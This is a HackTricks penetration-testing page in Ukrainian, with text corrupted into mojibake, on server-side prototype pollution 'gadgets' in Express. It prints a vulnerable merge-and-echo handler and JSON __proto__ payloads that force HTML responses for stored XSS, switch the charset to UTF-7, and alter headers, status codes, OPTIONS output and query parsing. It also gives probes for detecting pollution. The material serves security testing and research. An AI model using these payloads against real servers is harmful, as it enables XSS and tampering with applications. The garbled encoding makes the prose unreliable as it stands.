# –ì–∞–¥–∂–µ—Ç–∏ –¥–ª—è –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É Express

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## –ù–∞–¥–∞–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ XSS

**–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –≤—ñ–¥–æ–º–æ—Å—Ç–µ–π [–ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è](https://portswigger.net/research/server-side-prototype-pollution)**

### –ó–º—ñ–Ω–∏—Ç–∏ —Ç–∏–ø –≤–º—ñ—Å—Ç—É JSON –Ω–∞ HTML

–£ –¥–æ–¥–∞—Ç–∫—É Express, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **—Ç–∏–ø –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ JSON** —Ç–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
–£ —Ü–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö XSS –∑–∞–∑–≤–∏—á–∞–π –Ω–µ–º–æ–∂–ª–∏–≤–∏–π –∑ JSON —Ç–∏–ø–æ–º –≤–º—ñ—Å—Ç—É. –û–¥–Ω–∞–∫ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –º–∏ –º–æ–∂–µ–º–æ **–ø–µ—Ä–µ–ø–ª—É—Ç–∞—Ç–∏ Express, —â–æ–± –≤—ñ–Ω –≤—ñ–¥–ø—Ä–∞–≤–∏–≤ –≤—ñ–¥–ø–æ–≤—ñ–¥—å —É —Ñ–æ—Ä–º–∞—Ç—ñ HTML.** –¶—è —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å “ë—Ä—É–Ω—Ç—É—î—Ç—å—Å—è –Ω–∞ —Ç–æ–º—É, —â–æ –¥–æ–¥–∞—Ç–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **`res.send(obj)`** —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ä–æ–∑–±—ñ—Ä–Ω–∏–∫ —Ç—ñ–ª–∞ –∑ —Ç–∏–ø–æ–º –≤–º—ñ—Å—Ç—É application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
–ó–∞–±—Ä—É–¥–Ω—é—é—á–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ **`body`** —Ç–∞ **`_body`**, –º–æ–∂–Ω–∞ –∑–º—É—Å–∏—Ç–∏ **Express –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞—Ç–∏ –≤–º—ñ—Å—Ç HTML** —Ç–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `_body`, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–±–µ—Ä–µ–∂–µ–Ω–æ–≥–æ XSS.

### –í—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è UTF7

–ú–æ–∂–ª–∏–≤–æ –∑—Ä–æ–±–∏—Ç–∏ express **–≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏ –≤–º—ñ—Å—Ç UTF-7 –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## –ë–µ–∑–ø–µ—á–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è

### –ü—Ä–æ—Å—Ç–æ—Ä–∏ JSON

–ù–∞—Å—Ç—É–ø–Ω–∏–π PP –¥–æ–∑–≤–æ–ª–∏—Ç—å –∞—Ç—Ä–∏–±—É—Ç–∞–º –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ JSON –º–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–π –ø—Ä–æ–±—ñ–ª, —è–∫–∏–π –Ω–µ –ø–æ—Ä—É—à–∏—Ç—å —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å:
```json
{"__proto__":{"json spaces": " "}}
```
–ü–æ—Ç—ñ–º –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–∏–π JSON –±—É–¥–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ —Ç–∞–∫:
```json
{"foo":  "bar"} -- Note the extra space
```
### –í—ñ–¥–∫—Ä–∏—Ç—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏

–ù–∞—Å—Ç—É–ø–Ω–∏–π –≥–∞–¥–∂–µ—Ç PP –∑–º—É—Å–∏—Ç—å —Å–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ HTTP-–∑–∞–≥–æ–ª–æ–≤–æ–∫: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
–ù–µ–æ–±—Ö—ñ–¥–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –º–æ–¥—É–ª—å **CORS**

### **–ú–µ—Ç–æ–¥ OPTIONS**

–ó –Ω–∞—Å—Ç—É–ø–Ω–∏–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º –º–æ–∂–ª–∏–≤–æ **–ø—Ä–∏—Ö–æ–≤–∞—Ç–∏ –º–µ—Ç–æ–¥ –≤—ñ–¥ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **–°—Ç–∞—Ç—É—Å**

–ú–æ–∂–ª–∏–≤–æ –∑–º—ñ–Ω–∏—Ç–∏ **–ø–æ–≤–µ—Ä–Ω—É—Ç–∏–π –∫–æ–¥ —Å—Ç–∞—Ç—É—Å—É** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ PP –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ:
```json
{"__proto__":{"status":510}}
```
### –ü–æ–º–∏–ª–∫–∞

–ö–æ–ª–∏ –≤–∏ –ø—Ä–∏–∑–Ω–∞—á–∞—î—Ç–µ –ø—Ä–æ—Ç–æ—Ç–∏–ø –∑ –ø—Ä–∏–º—ñ—Ç–∏–≤–æ–º, —Ç–∞–∫–∏–º —è–∫ —Ä—è–¥–æ–∫, —Ü–µ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ **–æ–ø–µ—Ä–∞—Ü—ñ—ó no-op, –æ—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–æ—Ç–æ—Ç–∏–ø –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –æ–±'—î–∫—Ç–æ–º**. –Ø–∫—â–æ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –ø—Ä–∏–∑–Ω–∞—á–∏—Ç–∏ –æ–±'—î–∫—Ç –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –¥–ª—è `Object.prototype` —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ, —Ü–µ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ **–≤–∏–Ω—è—Ç–∫—É**. –ú–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—ñ –¥–≤—ñ –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ –¥–ª—è **–≤–∏—è–≤–ª–µ–Ω–Ω—è —É—Å–ø—ñ—à–Ω–æ—Å—Ç—ñ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### –í—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è

–ö–æ–ª–∏ –¥–æ–¥–∞—Ç–æ–∫ –≤–∫–ª—é—á–∞—î –æ–±'—î–∫—Ç —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å, —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç—É –∑ **–Ω–µ–∑–≤–∏—á–∞–π–Ω–æ—é –Ω–∞–∑–≤–æ—é –ø–æ—Ä—è–¥ –∑ `__proto__`** –º–æ–∂–µ –±—É—Ç–∏ –ø–æ–∫–∞–∑–æ–≤–∏–º. –ó–æ–∫—Ä–µ–º–∞, —è–∫—â–æ **—É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –ª–∏—à–µ –Ω–µ–∑–≤–∏—á–∞–π–Ω–∏–π –∞—Ç—Ä–∏–±—É—Ç**, —Ü–µ –º–æ–∂–µ —Å–≤—ñ–¥—á–∏—Ç–∏ –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–æ–¥–∞—Ç–∫–∞:
```json
{"unusualName":"value","__proto__":"test"}
```
–ö—Ä—ñ–º —Ç–æ–≥–æ, –≤ —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, –¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞, —Ç–∞–∫–∞ —è–∫ Lodash, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ —è–∫ —á–µ—Ä–µ–∑ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É (PP), —Ç–∞–∫ —ñ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –æ–±'—î–∫—Ç–∞, –ø—Ä–æ–ø–æ–Ω—É—î —â–µ –æ–¥–∏–Ω –¥—ñ–∞–≥–Ω–æ—Å—Ç–∏—á–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥. –Ø–∫—â–æ —Ç–∞–∫–∞ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å –≤—ñ–¥—Å—É—Ç–Ω—è —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, —Ü–µ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ —Ç–µ, —â–æ Lodash –ø–µ—Ä–µ–≤—ñ—Ä—è—î –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –≤ —Ü—ñ–ª—å–æ–≤–æ–º—É –æ–±'—î–∫—Ç—ñ –ø–µ—Ä–µ–¥ –∑–ª–∏—Ç—Ç—è–º:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## –†—ñ–∑–Ω–µ

### –î–æ–∑–≤—ñ–ª –∫—Ä–∞–ø–æ–∫

–Ñ –æ–ø—Ü—ñ—è –≤ Express, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î **—Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –æ–±'—î–∫—Ç–∏ –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ —Ä—è–¥–∫–∞ –∑–∞–ø–∏—Ç—É**.\
–í–∏ –∑–≤–∏—á–∞–π–Ω–æ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ –≤ –ª–∞–Ω—Ü—é–∂–∫—É –ø–æ–º–∏–ª–æ–∫ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó **–≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` —Å—Ç–≤–æ—Ä—é—î –æ–±'—î–∫—Ç –≤ Node.**

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.**

</details>
